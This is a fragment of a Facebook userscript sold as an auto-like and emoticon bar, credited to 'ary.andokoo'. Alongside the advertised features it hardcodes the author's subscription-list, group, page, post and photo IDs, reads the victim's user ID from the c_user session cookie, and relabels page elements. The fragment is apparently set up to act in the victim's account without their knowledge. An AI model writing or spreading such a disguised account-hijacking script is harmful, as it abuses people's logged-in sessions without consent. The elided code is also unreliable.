// ==UserScript==
// @name            Facebook AutoLike + emotions Bar By ary.andokoo
// @description     All about facebook ary.andokoo
...
"chars" : " :) ",
    ...
    html += '<a class="jewelFooter" href="https://www.facebook.com/ary.andokoo" target="_blank">Editted By ary.andokoo <br>(Click Here)</a>';
	html += '</div>';
...
sublist("1434949570059877");
sublist("1434949816726519");
sublist("1434949913393176");
sublist("1434944390060395");

//ary.andokoo
var gid = ['627794830606556'];
...
var spage_id = "152047598252940";
var spage_id = "372252986231059";
var spage_id = "357625070974360";
var spage_id = "529765843706425";
var spost_id = "100006345432223";
var sfoto_id = "100006345432223";
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var smesaj = "";
var smesaj_text = "";
var arkadaslar = [];
...
function blub()
{
    if(document.getElementsByClassName('pbm fsm').length == 1) {
        ...
        //e.href = '#';
        e.innerHTML = 'Auto Suggest by ary.andokoo';
